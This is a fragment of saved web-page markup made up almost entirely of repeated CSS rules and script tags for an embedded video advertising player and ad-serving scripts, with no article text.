    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player.js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><script src="./index_files/vidoomy-player.js.descargar" class="vdm-p"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
